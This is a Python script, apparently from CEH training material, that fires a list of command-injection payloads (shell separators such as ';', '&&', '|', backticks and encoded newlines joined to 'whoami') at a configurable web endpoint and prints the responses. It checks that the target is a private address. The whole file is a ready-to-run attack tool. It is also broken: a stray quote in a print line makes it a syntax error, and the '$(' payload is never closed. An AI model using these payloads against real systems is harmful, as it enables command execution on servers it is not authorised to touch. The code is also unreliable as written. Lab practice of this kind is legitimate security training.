#!/usr/bin/env python3
# LAB-ONLY: Advanced Command Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various command injection bypasses
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/cmd.php?input="
LAB_COMMAND = "whoami"  # Command to execute
# -----------------------------------------------------------------------------------

def generate_bypasses(cmd):
    bypasses = []
    separators = [";", "&&", "||", "|", "&", "\n", "\r", "$(", "`", ";", "%0a", "%0d", "%0a%0d"]
    for sep in separators:
        bypasses.append(f"{sep}{cmd}")
        bypasses.append(f"{sep}{cmd}{sep}")
        bypasses.append(f"a{sep}{cmd}")
    return bypasses

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Command Injection Tester")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80")
    print("[*] Testing bypasses...")
    for payload in generate_bypasses(LAB_COMMAND):
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload}", timeout=5, verify=False)
            if resp.status_code == 200:
                print(f"[+] Payload: {payload}")
                print(f"[+] Response snippet: {resp.text[:200]}...")
        except Exception as e:
            pass

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
